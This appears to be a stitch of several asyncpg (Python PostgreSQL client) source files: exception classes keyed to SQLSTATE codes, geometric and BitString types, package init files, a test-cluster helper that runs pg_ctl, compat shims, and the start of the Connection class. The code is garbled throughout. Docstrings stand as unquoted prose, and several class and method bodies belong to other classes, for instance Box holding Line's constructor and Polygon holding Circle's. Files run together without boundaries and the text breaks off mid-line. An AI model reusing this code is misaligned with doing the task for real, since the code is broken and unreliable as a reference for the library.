InvalidSchemaDefinitionError(SyntaxOrAccessError):\\nsqlstate = '42P15'\\n\\n\\nclass InvalidTableDefinitionError(SyntaxOrAccessError):\\nsqlstate = '42P16'\\n\\n\\nclass InvalidObjectDefinitionError(SyntaxOrAccessError):\\nsqlstate = '42P17'\\n\\n\\nclass WithCheckOptionViolationError(_base.PostgresError):\\nsqlstate = '44000'\\n\\n\\nclass InsufficientResourcesError(_base.PostgresError):\\nsqlstate = '53000'\\n\\n\\nclass DiskFullError(InsufficientResourcesError):\\nsqlstate = '53100'\\n\\n\\nclass OutOfMemoryError(InsufficientResourcesError):\\nsqlstate = '53200'\\n\\n\\nclass TooManyConnectionsError(InsufficientResourcesError):\\nsqlstate = '53300'\\n\\n\\nclass ConfigurationLimitExceededError(InsufficientResourcesError):\\nsqlstate = '53400'\\n\\n\\nclass ProgramLimitExceededError(_base.PostgresError):\\nsqlstate = '54000'\\n\\n\\nclass StatementTooComplexError(ProgramLimitExceededError):\\nsqlstate = '54001'\\n\\n\\nclass TooManyColumnsError(ProgramLimitExceededError):\\nsqlstate = '54011'\\n\\n\\nclass TooManyArgumentsError(ProgramLimitExceededError):\\nsqlstate = '54023'\\n\\n\\nclass ObjectNotInPrerequisiteStateError(_base.PostgresError):\\nsqlstate = '55000'\\n\\n\\nclass ObjectInUseError(ObjectNotInPrerequisiteStateError):\\nsqlstate = '55006'\\n\\n\\nclass CantChangeRuntimeParamError(ObjectNotInPrerequisiteStateError):\\nsqlstate = '55P02'\\n\\n\\nclass LockNotAvailableError(ObjectNotInPrerequisiteStateError):\\nsqlstate = '55P03'\\n\\n\\nclass UnsafeNewEnumValueUsageError(ObjectNotInPrerequisiteStateError):\\nsqlstate = '55P04'\\n\\n\\nclass OperatorInterventionError(_base.PostgresError):\\nsqlstate = '57000'\\n\\n\\nclass QueryCanceledError(OperatorInterventionError):\\nsqlstate = '57014'\\n\\n\\nclass AdminShutdownError(OperatorInterventionError):\\nsqlstate = '57P01'\\n\\n\\nclass CrashShutdownError(OperatorInterventionError):\\nsqlstate = '57P02'\\n\\n\\nclass CannotConnectNowError(OperatorInterventionError):\\nsqlstate = '57P03'\\n\\n\\nclass DatabaseDroppedError(OperatorInterventionError):\\nsqlstate = '57P04'\\n\\n\\nclass IdleSessionTimeoutError(OperatorInterventionError):\\nsqlstate = '57P05'\\n\\n\\nclass PostgresSystemError(_base.PostgresError):\\nsqlstate = '58000'\\n\\n\\nclass PostgresIOError(PostgresSystemError):\\nsqlstate = '58030'\\n\\n\\nclass UndefinedFileError(PostgresSystemError):\\nsqlstate = '58P01'\\n\\n\\nclass DuplicateFileError(PostgresSystemError):\\nsqlstate = '58P02'\\n\\n\\nclass FileNameTooLongError(PostgresSystemError):\\nsqlstate = '58P03'\\n\\n\\nclass SnapshotTooOldError(_base.PostgresError):\\nsqlstate = '72000'\\n\\n\\nclass ConfigFileError(_base.PostgresError):\\nsqlstate = 'F0000'\\n\\n\\nclass LockFileExistsError(ConfigFileError):\\nsqlstate = 'F0001'\\n\\n\\nclass FDWError(_base.PostgresError):\\nsqlstate = 'HV000'\\n\\n\\nclass FDWColumnNameNotFoundError(FDWError):\\nsqlstate = 'HV005'\\n\\n\\nclass FDWDynamicParameterValueNeededError(FDWError):\\nsqlstate = 'HV002'\\n\\n\\nclass FDWFunctionSequenceError(FDWError):\\nsqlstate = 'HV010'\\n\\n\\nclass FDWInconsistentDescriptorInformationError(FDWError):\\nsqlstate = 'HV021'\\n\\n\\nclass FDWInvalidAttributeValueError(FDWError):\\nsqlstate = 'HV024'\\n\\n\\nclass FDWInvalidColumnNameError(FDWError):\\nsqlstate = 'HV007'\\n\\n\\nclass FDWInvalidColumnNumberError(FDWError):\\nsqlstate = 'HV008'\\n\\n\\nclass FDWInvalidDataTypeError(FDWError):\\nsqlstate = 'HV004'\\n\\n\\nclass FDWInvalidDataTypeDescriptorsError(FDWError):\\nsqlstate = 'HV006'\\n\\n\\nclass FDWInvalidDescriptorFieldIdentifierError(FDWError):\\nsqlstate = 'HV091'\\n\\n\\nclass FDWInvalidHandleError(FDWError):\\nsqlstate = 'HV00B'\\n\\n\\nclass FDWInvalidOptionIndexError(FDWError):\\nsqlstate = 'HV00C'\\n\\n\\nclass FDWInvalidOptionNameError(FDWError):\\nsqlstate = 'HV00D'\\n\\n\\nclass FDWInvalidStringLengthOrBufferLengthError(FDWError):\\nsqlstate = 'HV090'\\n\\n\\nclass FDWInvalidStringFormatError(FDWError):\\nsqlstate = 'HV00A'\\n\\n\\nclass FDWInvalidUseOfNullPointerError(FDWError):\\nsqlstate = 'HV009'\\n\\n\\nclass FDWTooManyHandlesError(FDWError):\\nsqlstate = 'HV014'\\n\\n\\nclass FDWOutOfMemoryError(FDWError):\\nsqlstate = 'HV001'\\n\\n\\nclass FDWNoSchemasError(FDWError):\\nsqlstate = 'HV00P'\\n\\n\\nclass FDWOptionNameNotFoundError(FDWError):\\nsqlstate = 'HV00J'\\n\\n\\nclass FDWReplyHandleError(FDWError):\\nsqlstate = 'HV00K'\\n\\n\\nclass FDWSchemaNotFoundError(FDWError):\\nsqlstate = 'HV00Q'\\n\\n\\nclass FDWTableNotFoundError(FDWError):\\nsqlstate = 'HV00R'\\n\\n\\nclass FDWUnableToCreateExecutionError(FDWError):\\nsqlstate = 'HV00L'\\n\\n\\nclass FDWUnableToCreateReplyError(FDWError):\\nsqlstate = 'HV00M'\\n\\n\\nclass FDWUnableToEstablishConnectionError(FDWError):\\nsqlstate = 'HV00N'\\n\\n\\nclass PLPGSQLError(_base.PostgresError):\\nsqlstate = 'P0000'\\n\\n\\nclass RaiseError(PLPGSQLError):\\nsqlstate = 'P0001'\\n\\n\\nclass NoDataFoundError(PLPGSQLError):\\nsqlstate = 'P0002'\\n\\n\\nclass TooManyRowsError(PLPGSQLError):\\nsqlstate = 'P0003'\\n\\n\\nclass AssertError(PLPGSQLError):\\nsqlstate = 'P0004'\\n\\n\\nclass InternalServerError(_base.PostgresError):\\nsqlstate = 'XX000'\\n\\n\\nclass DataCorruptedError(InternalServerError):\\nsqlstate = 'XX001'\\n\\n\\nclass IndexCorruptedError(InternalServerError):\\nsqlstate = 'XX002'\\n\\n\\n__all__ = (\\n'ActiveSQLTransactionError', 'AdminShutdownError',\\n'AmbiguousAliasError', 'AmbiguousColumnError',\\n'AmbiguousFunctionError', 'AmbiguousParameterError',\\n'ArraySubscriptError', 'AssertError', 'BadCopyFileFormatError',\\n'BranchTransactionAlreadyActiveError', 'CannotCoerceError',\\n'CannotConnectNowError', 'CantChangeRuntimeParamError',\\n'CardinalityViolationError', 'CaseNotFoundError',\\n'CharacterNotInRepertoireError', 'CheckViolationError',\\n'ClientCannotConnectError', 'CollationMismatchError',\\n'ConfigFileError', 'ConfigurationLimitExceededError',\\n'ConnectionDoesNotExistError', 'ConnectionFailureError',\\n'ConnectionRejectionError', 'ContainingSQLNotPermittedError',\\n'CrashShutdownError', 'DataCorruptedError', 'DataError',\\n'DatabaseDroppedError', 'DatatypeMismatchError',\\n'DatetimeFieldOverflowError', 'DeadlockDetectedError',\\n'DependentObjectsStillExistError',\\n'DependentPrivilegeDescriptorsStillExistError', 'DeprecatedFeature',\\n'DiagnosticsError', 'DiskFullError', 'DivisionByZeroError',\\n'DuplicateAliasError', 'DuplicateColumnError', 'DuplicateCursorError',\\n'DuplicateDatabaseError', 'DuplicateFileError',\\n'DuplicateFunctionError', 'DuplicateJsonObjectKeyValueError',\\n'DuplicateObjectError', 'DuplicatePreparedStatementError',\\n'DuplicateSchemaError', 'DuplicateTableError',\\n'DynamicResultSetsReturned', 'ErrorInAssignmentError',\\n'EscapeCharacterConflictError', 'EventTriggerProtocolViolatedError',\\n'ExclusionViolationError', 'ExternalRoutineError',\\n'ExternalRoutineInvocationError', 'FDWColumnNameNotFoundError',\\n'FDWDynamicParameterValueNeededError', 'FDWError',\\n'FDWFunctionSequenceError',\\n'FDWInconsistentDescriptorInformationError',\\n'FDWInvalidAttributeValueError', 'FDWInvalidColumnNameError',\\n'FDWInvalidColumnNumberError', 'FDWInvalidDataTypeDescriptorsError',\\n'FDWInvalidDataTypeError', 'FDWInvalidDescriptorFieldIdentifierError',\\n'FDWInvalidHandleError', 'FDWInvalidOptionIndexError',\\n'FDWInvalidOptionNameError', 'FDWInvalidStringFormatError',\\n'FDWInvalidStringLengthOrBufferLengthError',\\n'FDWInvalidUseOfNullPointerError', 'FDWNoSchemasError',\\n'FDWOptionNameNotFoundError', 'FDWOutOfMemoryError',\\n'FDWReplyHandleError', 'FDWSchemaNotFoundError',\\n'FDWTableNotFoundError', 'FDWTooManyHandlesError',\\n'FDWUnableToCreateExecutionError', 'FDWUnableToCreateReplyError',\\n'FDWUnableToEstablishConnectionError', 'FeatureNotSupportedError',\\n'FileNameTooLongError', 'ForeignKeyViolationError',\\n'FunctionExecutedNoReturnStatementError', 'GeneratedAlwaysError',\\n'GroupingError', 'HeldCursorRequiresSameIsolationLevelError',\\n'IdleInTransactionSessionTimeoutError', 'IdleSessionTimeoutError',\\n'ImplicitZeroBitPadding', 'InFailedSQLTransactionError',\\n'InappropriateAccessModeForBranchTransactionError',\\n'InappropriateIsolationLevelForBranchTransactionError',\\n'IndeterminateCollationError', 'IndeterminateDatatypeError',\\n'IndexCorruptedError', 'IndicatorOverflowError',\\n'InsufficientPrivilegeError', 'InsufficientResourcesError',\\n'IntegrityConstraintViolationError', 'InternalServerError',\\n'IntervalFieldOverflowError', 'InvalidArgumentForLogarithmError',\\n'InvalidArgumentForNthValueFunctionError',\\n'InvalidArgumentForNtileFunctionError',\\n'InvalidArgumentForPowerFunctionError',\\n'InvalidArgumentForSQLJsonDatetimeFunctionError',\\n'InvalidArgumentForWidthBucketFunctionError',\\n'InvalidArgumentForXqueryError',\\n'InvalidAuthorizationSpecificationError',\\n'InvalidBinaryRepresentationError', 'InvalidCachedStatementError',\\n'InvalidCatalogNameError', 'InvalidCharacterValueForCastError',\\n'InvalidColumnDefinitionError', 'InvalidColumnReferenceError',\\n'InvalidCursorDefinitionError', 'InvalidCursorNameError',\\n'InvalidCursorStateError', 'InvalidDatabaseDefinitionError',\\n'InvalidDatetimeFormatError', 'InvalidEscapeCharacterError',\\n'InvalidEscapeOctetError', 'InvalidEscapeSequenceError',\\n'InvalidForeignKeyError', 'InvalidFunctionDefinitionError',\\n'InvalidGrantOperationError', 'InvalidGrantorError',\\n'InvalidIndicatorParameterValueError', 'InvalidJsonTextError',\\n'InvalidLocatorSpecificationError', 'InvalidNameError',\\n'InvalidObjectDefinitionError', 'InvalidParameterValueError',\\n'InvalidPasswordError', 'InvalidPrecedingOrFollowingSizeError',\\n'InvalidPreparedStatementDefinitionError', 'InvalidRecursionError',\\n'InvalidRegularExpressionError', 'InvalidRoleSpecificationError',\\n'InvalidRowCountInLimitClauseError',\\n'InvalidRowCountInResultOffsetClauseError',\\n'InvalidSQLJsonSubscriptError', 'InvalidSQLStatementNameError',\\n'InvalidSavepointSpecificationError', 'InvalidSchemaDefinitionError',\\n'InvalidSchemaNameError', 'InvalidSqlstateReturnedError',\\n'InvalidTableDefinitionError', 'InvalidTablesampleArgumentError',\\n'InvalidTablesampleRepeatError', 'InvalidTextRepresentationError',\\n'InvalidTimeZoneDisplacementValueError',\\n'InvalidTransactionInitiationError', 'InvalidTransactionStateError',\\n'InvalidTransactionTerminationError',\\n'InvalidUseOfEscapeCharacterError', 'InvalidXmlCommentError',\\n'InvalidXmlContentError', 'InvalidXmlDocumentError',\\n'InvalidXmlProcessingInstructionError', 'LocatorError',\\n'LockFileExistsError', 'LockNotAvailableError',\\n'ModifyingExternalRoutineSQLDataNotPermittedError',\\n'ModifyingSQLDataNotPermittedError', 'MoreThanOneSQLJsonItemError',\\n'MostSpecificTypeMismatchError', 'NameTooLongError',\\n'NoActiveSQLTransactionError',\\n'NoActiveSQLTransactionForBranchTransactionError',\\n'NoAdditionalDynamicResultSetsReturned', 'NoData', 'NoDataFoundError',\\n'NoSQLJsonItemError', 'NonNumericSQLJsonItemError',\\n'NonUniqueKeysInAJsonObjectError',\\n'NonstandardUseOfEscapeCharacterError', 'NotAnXmlDocumentError',\\n'NotNullViolationError', 'NullValueEliminatedInSetFunction',\\n'NullValueInExternalRoutineNotAllowedError',\\n'NullValueNoIndicatorParameterError', 'NullValueNotAllowedError',\\n'NumericValueOutOfRangeError', 'ObjectInUseError',\\n'ObjectNotInPrerequisiteStateError', 'OperatorInterventionError',\\n'OutOfMemoryError', 'PLPGSQLError', 'PostgresConnectionError',\\n'PostgresFloatingPointError', 'PostgresIOError',\\n'PostgresSyntaxError', 'PostgresSystemError', 'PostgresWarning',\\n'PrivilegeNotGranted', 'PrivilegeNotRevoked',\\n'ProgramLimitExceededError',\\n'ProhibitedExternalRoutineSQLStatementAttemptedError',\\n'ProhibitedSQLStatementAttemptedError', 'ProtocolViolationError',\\n'QueryCanceledError', 'RaiseError', 'ReadOnlySQLTransactionError',\\n'ReadingExternalRoutineSQLDataNotPermittedError',\\n'ReadingSQLDataNotPermittedError', 'ReservedNameError',\\n'RestrictViolationError', 'SQLJsonArrayNotFoundError',\\n'SQLJsonItemCannotBeCastToTargetTypeError',\\n'SQLJsonMemberNotFoundError', 'SQLJsonNumberNotFoundError',\\n'SQLJsonObjectNotFoundError', 'SQLJsonScalarRequiredError',\\n'SQLRoutineError', 'SQLStatementNotYetCompleteError',\\n'SavepointError', 'SchemaAndDataStatementMixingNotSupportedError',\\n'SequenceGeneratorLimitExceededError', 'SerializationError',\\n'SingletonSQLJsonItemRequiredError', 'SnapshotTooOldError',\\n'SrfProtocolViolatedError',\\n'StackedDiagnosticsAccessedWithoutActiveHandlerError',\\n'StatementCompletionUnknownError', 'StatementTooComplexError',\\n'StringDataLengthMismatchError', 'StringDataRightTruncation',\\n'StringDataRightTruncationError', 'SubstringError',\\n'SyntaxOrAccessError', 'TooManyArgumentsError', 'TooManyColumnsError',\\n'TooManyConnectionsError', 'TooManyJsonArrayElementsError',\\n'TooManyJsonObjectMembersError', 'TooManyRowsError',\\n'TransactionIntegrityConstraintViolationError',\\n'TransactionResolutionUnknownError', 'TransactionRollbackError',\\n'TransactionTimeoutError', 'TriggerProtocolViolatedError',\\n'TriggeredActionError', 'TriggeredDataChangeViolationError',\\n'TrimError', 'UndefinedColumnError', 'UndefinedFileError',\\n'UndefinedFunctionError', 'UndefinedObjectError',\\n'UndefinedParameterError', 'UndefinedTableError',\\n'UniqueViolationError', 'UnsafeNewEnumValueUsageError',\\n'UnterminatedCStringError', 'UntranslatableCharacterError',\\n'WindowingError', 'WithCheckOptionViolationError',\\n'WrongObjectTypeError', 'ZeroLengthCharacterStringError'\\n)\\n\\n__all__ += _base.__all__\\n\\n\\nimport builtins\\nimport sys\\nimport typing\\n\\nif sys.version_info >= (3, 8):\\nfrom typing import Literal, SupportsIndex\\nelse:\\nfrom typing_extensions import Literal, SupportsIndex\\n\\n\\n__all__ = (\\n'BitString', 'Point', 'Path', 'Polygon',\\n'Box', 'Line', 'LineSegment', 'Circle',\\n)\\n\\n_BitString = typing.TypeVar('_BitString', bound='BitString')\\n_BitOrderType = Literal['big', 'little']\\n\\n\\nclass BitString:\\nActs similarly to int.from_bytes.\\n\\n:param bitorder:\\nDetermines the bit order used to interpret the BitString. By\\ndefault, this function uses Postgres conventions for casting bits\\nto ints. If bitorder is 'big', the most significant bit is at the\\nstart of the string (this is the same as the default). If bitorder\\nis 'little', the most significant bit is at the end of the string.\\n\\n:param bool signed:\\nDetermines whether two's complement is used to interpret the\\nBitString. If signed is False, the returned value is always\\nnon-negative.\\n\\n:return int: An integer representing the BitString. Information about\\nthe BitString's exact length is lost.\\n\\n.. versionadded:: 0.18.0\\nActs similarly to int.to_bytes.\\n\\n:param int x:\\nAn integer to represent. Negative integers are represented in two's\\ncomplement form, unless the argument signed is False, in which case\\nnegative integers raise an OverflowError.\\n\\n:param int length:\\nThe length of the resulting BitString. An OverflowError is raised\\nif the integer is not representable in this many bits.\\n\\n:param bitorder:\\nDetermines the bit order used in the BitString representation. By\\ndefault, this function uses Postgres conventions for casting ints\\nto bits. If bitorder is 'big', the most significant bit is at the\\nstart of the string (this is the same as the default). If bitorder\\nis 'little', the most significant bit is at the end of the string.\\n\\n:param bool signed:\\nDetermines whether two's complement is used in the BitString\\nrepresentation. If signed is False and a negative integer is given,\\nan OverflowError is raised.\\n\\n:return BitString: A BitString representing the input integer, in the\\nform specified by the other input args.\\n\\n.. versionadded:: 0.18.0\\n\\n__slots__ = ()\\n\\ndef __new__(cls,\\nx: typing.Union[typing.SupportsFloat,\\nSupportsIndex,\\ntyping.Text,\\nbuiltins.bytes,\\nbuiltins.bytearray],\\ny: typing.Union[typing.SupportsFloat,\\nSupportsIndex,\\ntyping.Text,\\nbuiltins.bytes,\\nbuiltins.bytearray]) -> 'Point':\\nreturn super().__new__(cls,\\ntyping.cast(typing.Any, (float(x), float(y))))\\n\\ndef __repr__(self) -> str:\\nreturn '{}.{}({})'.format(\\ntype(self).__module__,\\ntype(self).__name__,\\ntuple.__repr__(self)\\n)\\n\\n@property\\ndef x(self) -> float:\\nreturn self[0]\\n\\n@property\\ndef y(self) -> float:\\nreturn self[1]\\n\\n\\nclass Box(typing.Tuple[Point, Point]):\\n\\n__slots__ = ()\\n\\ndef __new__(cls, A: float, B: float, C: float) -> 'Line':\\nreturn super().__new__(cls, typing.cast(typing.Any, (A, B, C)))\\n\\n@property\\ndef A(self) -> float:\\nreturn self[0]\\n\\n@property\\ndef B(self) -> float:\\nreturn self[1]\\n\\n@property\\ndef C(self) -> float:\\nreturn self[2]\\n\\n\\nclass LineSegment(typing.Tuple[Point, Point]):\\n\\n__slots__ = '_is_closed', 'points'\\n\\npoints: typing.Tuple[Point, ...]\\n\\ndef __init__(self, *points: typing.Sequence[float],\\nis_closed: bool = False) -> None:\\nself.points = tuple(Point(*p) for p in points)\\nself._is_closed = is_closed\\n\\n@property\\ndef is_closed(self) -> bool:\\nreturn self._is_closed\\n\\ndef __eq__(self, other: object) -> bool:\\nif not isinstance(other, Path):\\nreturn NotImplemented\\n\\nreturn (self.points == other.points and\\nself._is_closed == other._is_closed)\\n\\ndef __hash__(self) -> int:\\nreturn hash((self.points, self.is_closed))\\n\\ndef __iter__(self) -> typing.Iterator[Point]:\\nreturn iter(self.points)\\n\\ndef __len__(self) -> int:\\nreturn len(self.points)\\n\\n@typing.overload\\ndef __getitem__(self, i: int) -> Point:\\n...\\n\\n@typing.overload\\ndef __getitem__(self, i: slice) -> typing.Tuple[Point, ...]:\\n...\\n\\ndef __getitem__(self, i: typing.Union[int, slice]) \\\\\\n-> typing.Union[Point, typing.Tuple[Point, ...]]:\\nreturn self.points[i]\\n\\ndef __contains__(self, point: object) -> bool:\\nreturn point in self.points\\n\\n\\nclass Polygon(Path):\\n\\n__slots__ = ()\\n\\ndef __new__(cls, center: Point, radius: float) -> 'Circle':\\nreturn super().__new__(cls, typing.cast(typing.Any, (center, radius)))\\n\\n@property\\ndef center(self) -> Point:\\nreturn self[0]\\n\\n@property\\ndef radius(self) -> float:\\nreturn self[1]\\n\\nfrom __future__ import annotations\\n\\nimport typing\\n\\n__version__: typing.Final = '0.30.0'\\n\\nfrom __future__ import annotations\\n\\nfrom .connection import connect, Connection\\nfrom .exceptions import *\\nfrom .pool import create_pool, Pool\\nfrom .protocol import Record\\nfrom .types import *\\n\\n\\nfrom ._version import __version__\\n\\nfrom . import exceptions\\n\\n\\n__all__: tuple[str, ...] = (\\n'connect', 'create_pool', 'Pool', 'Record', 'Connection'\\n)\\n__all__ += exceptions.__all__\\n\\n\\n\\nimport functools\\n\\nfrom . import exceptions\\n\\n\\ndef guarded(meth):\\n\\n\\nimport asyncio\\nimport os\\nimport os.path\\nimport platform\\nimport random\\nimport re\\nimport shutil\\nimport socket\\nimport string\\nimport subprocess\\nimport sys\\nimport tempfile\\nimport textwrap\\nimport time\\n\\nimport asyncpg\\nfrom asyncpg import serverversion\\n\\n\\n_system = platform.uname().system\\n\\nif _system == 'Windows':\\ndef platform_exe(name):\\nif name.endswith('.exe'):\\nreturn name\\nreturn name + '.exe'\\nelse:\\ndef platform_exe(name):\\nreturn name\\n\\n\\ndef find_available_port():\\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\ntry:\\nsock.bind(('127.0.0.1', 0))\\nreturn sock.getsockname()[1]\\nexcept Exception:\\nreturn None\\nfinally:\\nsock.close()\\n\\n\\ndef _world_readable_mkdtemp(suffix=None, prefix=None, dir=None):\\nname = \\\"\\\".join(random.choices(string.ascii_lowercase, k=8))\\nif dir is None:\\ndir = tempfile.gettempdir()\\nif prefix is None:\\nprefix = tempfile.gettempprefix()\\nif suffix is None:\\nsuffix = \\\"\\\"\\nfn = os.path.join(dir, prefix + name + suffix)\\nos.mkdir(fn, 0o755)\\nreturn fn\\n\\n\\ndef _mkdtemp(suffix=None, prefix=None, dir=None):\\nif _system == 'Windows' and os.environ.get(\\\"GITHUB_ACTIONS\\\"):\\nreturn _world_readable_mkdtemp(suffix, prefix, dir)\\nelse:\\nreturn tempfile.mkdtemp(suffix, prefix, dir)\\n\\n\\nclass ClusterError(Exception):\\npass\\n\\n\\nclass Cluster:\\ndef __init__(self, data_dir, *, pg_config_path=None):\\nself._data_dir = data_dir\\nself._pg_config_path = pg_config_path\\nself._pg_bin_dir = (\\nos.environ.get('PGINSTALLATION')\\nor os.environ.get('PGBIN')\\n)\\nself._pg_ctl = None\\nself._daemon_pid = None\\nself._daemon_process = None\\nself._connection_addr = None\\nself._connection_spec_override = None\\n\\ndef get_pg_version(self):\\nreturn self._pg_version\\n\\ndef is_managed(self):\\nreturn True\\n\\ndef get_data_dir(self):\\nreturn self._data_dir\\n\\ndef get_status(self):\\nif self._pg_ctl is None:\\nself._init_env()\\n\\nprocess = subprocess.run(\\n[self._pg_ctl, 'status', '-D', self._data_dir],\\nstdout=subprocess.PIPE, stderr=subprocess.PIPE)\\nstdout, stderr = process.stdout, process.stderr\\n\\nif (process.returncode == 4 or not os.path.exists(self._data_dir) or\\nnot os.listdir(self._data_dir)):\\nreturn 'not-initialized'\\nelif process.returncode == 3:\\nreturn 'stopped'\\nelif process.returncode == 0:\\nr = re.match(r'.*PID\\\\s?:\\\\s+(\\\\d+).*', stdout.decode())\\nif not r:\\nraise ClusterError(\\n'could not parse pg_ctl status output: {}'.format(\\nstdout.decode()))\\nself._daemon_pid = int(r.group(1))\\nreturn self._test_connection(timeout=0)\\nelse:\\nraise ClusterError(\\n'pg_ctl status exited with status {:d}: {}'.format(\\nprocess.returncode, stderr))\\n\\nasync def connect(self, loop=None, **kwargs):\\nconn_info = self.get_connection_spec()\\nconn_info.update(kwargs)\\nreturn await asyncpg.connect(loop=loop, **conn_info)\\n\\ndef init(self, **settings):\\nstatus = self.get_status()\\nif status == 'running':\\nreturn\\nelif status == 'not-initialized':\\nraise ClusterError(\\n'cluster in {!r} has not been initialized'.format(\\nself._data_dir))\\n\\nport = opts.pop('port', None)\\nif port == 'dynamic':\\nport = find_available_port()\\n\\nextra_args = ['--{}={}'.format(k, v) for k, v in opts.items()]\\nextra_args.append('--port={}'.format(port))\\n\\nsockdir = server_settings.get('unix_socket_directories')\\nif sockdir is None:\\nsockdir = server_settings.get('unix_socket_directory')\\nif sockdir is None and _system != 'Windows':\\nsockdir = tempfile.gettempdir()\\n\\nssl_key = server_settings.get('ssl_key_file')\\nif ssl_key:\\nkeyfile = os.path.join(self._data_dir, 'srvkey.pem')\\nshutil.copy(ssl_key, keyfile)\\nos.chmod(keyfile, 0o600)\\nserver_settings = server_settings.copy()\\nserver_settings['ssl_key_file'] = keyfile\\n\\nif sockdir is not None:\\nif self._pg_version < (9, 3):\\nsockdir_opt = 'unix_socket_directory'\\nelse:\\nsockdir_opt = 'unix_socket_directories'\\n\\nserver_settings[sockdir_opt] = sockdir\\n\\nfor k, v in server_settings.items():\\nextra_args.extend(['-c', '{}={}'.format(k, v)])\\n\\nif _system == 'Windows':\\nif os.getenv('ASYNCPG_DEBUG_SERVER'):\\nstdout = sys.stdout\\nprint(\\n'asyncpg.cluster: Running',\\n' '.join([\\nself._pg_ctl, 'start', '-D', self._data_dir,\\n'-o', ' '.join(extra_args)\\n]),\\nfile=sys.stderr,\\n)\\nelse:\\nstdout = subprocess.DEVNULL\\n\\nprocess = subprocess.run(\\n[self._pg_ctl, 'start', '-D', self._data_dir,\\n'-o', ' '.join(extra_args)],\\nstdout=stdout,\\nstderr=subprocess.STDOUT,\\ncwd=self._data_dir,\\n)\\n\\nif process.returncode != 0:\\nif process.stderr:\\nstderr = ':\\\\n{}'.format(process.stderr.decode())\\nelse:\\nstderr = ''\\nraise ClusterError(\\n'pg_ctl start exited with status {:d}{}'.format(\\nprocess.returncode, stderr))\\nelse:\\nif os.getenv('ASYNCPG_DEBUG_SERVER'):\\nstdout = sys.stdout\\nelse:\\nstdout = subprocess.DEVNULL\\n\\nself._daemon_process = \\\\\\nsubprocess.Popen(\\n[self._postgres, '-D', self._data_dir, *extra_args],\\nstdout=stdout,\\nstderr=subprocess.STDOUT,\\ncwd=self._data_dir,\\n)\\n\\nself._daemon_pid = self._daemon_process.pid\\n\\nself._test_connection(timeout=wait)\\n\\ndef reload(self):\\nstatus = self.get_status()\\nif status == 'not-initialized':\\nraise ClusterError(\\n'cannot modify HBA records: cluster is not initialized')\\n\\npg_hba = os.path.join(self._data_dir, 'pg_hba.conf')\\n\\ntry:\\nwith open(pg_hba, 'w'):\\npass\\nexcept IOError as e:\\nraise ClusterError(\\n'cannot modify HBA records: {}'.format(e)) from e\\n\\ndef add_hba_entry(self, *, type='host', database, user, address=None,\\nauth_method, auth_options=None):\\nif self.get_status() != 'not-initialized':\\nraise ClusterError(\\n'cluster in {!r} has already been initialized'.format(\\nself._data_dir))\\n\\nprocess = subprocess.run(\\n[self._pg_basebackup, '-h', self._master['host'],\\n'-p', self._master['port'], '-D', self._data_dir,\\n'-U', self._repl_user],\\nstdout=subprocess.PIPE, stderr=subprocess.STDOUT)\\n\\noutput = process.stdout\\n\\nif process.returncode != 0:\\nraise ClusterError(\\n'pg_basebackup init exited with status {:d}:\\\\n{}'.format(\\nprocess.returncode, output.decode()))\\n\\nif self._pg_version < (12, 0):\\nwith open(os.path.join(self._data_dir, 'recovery.conf'), 'w') as f:\\nf.write(textwrap.dedent(\\\"\\\"\\\"\\\\\\nstandby_mode = 'on'\\nprimary_conninfo = 'host={host} port={port} user={user}'\\n\\nfrom __future__ import annotations\\n\\nimport enum\\nimport pathlib\\nimport platform\\nimport typing\\nimport sys\\n\\nif typing.TYPE_CHECKING:\\nimport asyncio\\n\\nSYSTEM: typing.Final = platform.uname().system\\n\\n\\nif sys.platform == 'win32':\\nimport ctypes.wintypes\\n\\nCSIDL_APPDATA: typing.Final = 0x001a\\n\\ndef get_pg_home_directory() -> pathlib.Path | None:\\nbuf = ctypes.create_unicode_buffer(ctypes.wintypes.MAX_PATH)\\nr = ctypes.windll.shell32.SHGetFolderPathW(0, CSIDL_APPDATA, 0, 0, buf)\\nif r:\\nreturn None\\nelse:\\nreturn pathlib.Path(buf.value) / 'postgresql'\\n\\nelse:\\ndef get_pg_home_directory() -> pathlib.Path | None:\\ntry:\\nreturn pathlib.Path.home()\\nexcept (RuntimeError, KeyError):\\nreturn None\\n\\n\\nasync def wait_closed(stream: asyncio.StreamWriter) -> None:\\nif hasattr(stream, 'wait_closed'):\\ntry:\\nawait stream.wait_closed()\\nexcept ConnectionResetError:\\npass\\n\\n\\nif sys.version_info < (3, 12):\\ndef markcoroutinefunction(c):\\npass\\nelse:\\nfrom inspect import markcoroutinefunction\\n\\n\\nif sys.version_info < (3, 12):\\nfrom ._asyncio_compat import wait_for as wait_for\\nelse:\\nfrom asyncio import wait_for as wait_for\\n\\n\\nif sys.version_info < (3, 11):\\nfrom ._asyncio_compat import timeout_ctx as timeout\\nelse:\\nfrom asyncio import timeout as timeout\\n\\nif sys.version_info < (3, 9):\\nfrom typing import (\\nAwaitable as Awaitable,\\n)\\nelse:\\nfrom collections.abc import (\\nAwaitable as Awaitable,\\n)\\n\\nif sys.version_info < (3, 11):\\nclass StrEnum(str, enum.Enum):\\n__str__ = str.__str__\\n__repr__ = enum.Enum.__repr__\\nelse:\\nfrom enum import StrEnum as StrEnum\\n\\n\\nimport asyncio\\nimport asyncpg\\nimport collections\\nimport collections.abc\\nimport contextlib\\nimport functools\\nimport itertools\\nimport inspect\\nimport os\\nimport sys\\nimport time\\nimport traceback\\nimport typing\\nimport warnings\\nimport weakref\\n\\nfrom . import compat\\nfrom . import connect_utils\\nfrom . import cursor\\nfrom . import exceptions\\nfrom . import introspection\\nfrom . import prepared_stmt\\nfrom . import protocol\\nfrom . import serverversion\\nfrom . import transaction\\nfrom . import utils\\n\\n\\nclass ConnectionMeta(type):\\n\\ndef __instancecheck__(cls, instance):\\nmro = type(instance).__mro__\\nreturn Connection in mro or _ConnectionProxy in mro\\n\\n\\nclass Connection(metaclass=ConnectionMeta):\\n\\n__slots__ = ('_protocol', '_transport', '_loop',\\n'_top_xact', '_aborted',\\n'_pool_release_ctr', '_stmt_cache', '_stmts_to_close',\\n'_stmt_cache_enabled',\\n'_listeners', '_server_version', '_server_caps',\\n'_intro_query', '_reset_query', '_proxy',\\n'_stmt_exclusive_section', '_config', '_params', '_addr',\\n'_log_listeners', '_termination_listeners', '_cancellations',\\n'_source_traceback', '_query_loggers', '__weakref__')\\n\\ndef __init__(self, protocol, transport, loop,\\naddr,\\nconfig: connect_utils._ClientConfiguration,\\nparams: connect_utils._ConnectionParameters):\\nself._protocol = protocol\\nself._transport = transport\\nself._loop = loop\\nself._top_xact = None\\nself._aborted = 